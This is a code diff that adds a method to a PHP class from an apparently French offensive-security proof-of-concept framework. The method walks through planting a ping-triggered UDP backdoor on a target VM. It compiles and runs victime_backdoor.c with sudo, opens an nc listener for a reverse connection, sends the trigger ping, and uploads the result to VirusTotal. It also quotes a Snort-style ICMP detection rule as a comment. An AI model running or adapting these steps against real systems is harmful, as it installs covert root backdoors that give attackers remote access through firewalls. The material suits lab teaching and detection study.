@@ -9,6 +9,33 @@ class poc4root extends poc4bof {
     
     
     
+    public function poc4trojan4linux_ping(){
+        $this->ssTitre("Backdoor UDP qui s'active lors d'un ping et se reverse connexion vers l'attaquant sur le port 2323" );
+        $this->important("Port 53 UDP -> sortir a travers le firewall" );
+        $ub = new vm($this->target_vmx_name);
+        $this->requette("cp -v $this->dir_c/victime_backdoor.c $this->dir_tmp/victime_backdoor.c" );
+        $this->requette("gedit $this->dir_tmp/victime_backdoor.c" );
+        $this->pause();
+        $this->cmd($this->target_vmx_name, "nc -ul $this->attacker_port -v" );
+        $ub->vm2upload("$this->dir_tmp/victime_backdoor.c", "$this->vm_tmp_lin/victime_backdoor.c");
+        $this->cmd($this->target_vmx_name, "gcc -o $this->vm_tmp_lin/victime_backdoor $this->vm_tmp_lin/victime_backdoor.c  2>/dev/null;sudo $this->vm_tmp_lin/victime_backdoor" ); // tools
+        $this->cmd("localhost", "ping $this->target_ip -c 1 -s 100" );
+        /*
+         * alert icmp any any -> any any (icmp_id: 100; msg: "ICMP ID=100";)
+         * alert icmp any any -> any any (icmp_seq: 100; msg: "ICMP Sequence=100";)
+         */
+        
+        $this->cmd($this->target_vmx_name, "sudo ps aux | grep victime_backdoor" );
+        $this->important("on voit bien le nom du programme dans la liste des processus" );
+        $rst = $ub->vm2process_list();
+        $this->requette("cat $rst | grep victime_backdoor");
+        $this->pause();
+        $ub->vm2download("$this->vm_tmp_lin/victime_backdoor", "$this->dir_tmp/victime_backdoor");
+        
+        $check = new file("$this->dir_tmp/victime_backdoor" );
+        $check->file_file2virus2vt();
+        $this->pause();
+    }
     
     public function poc4host4root(){
         
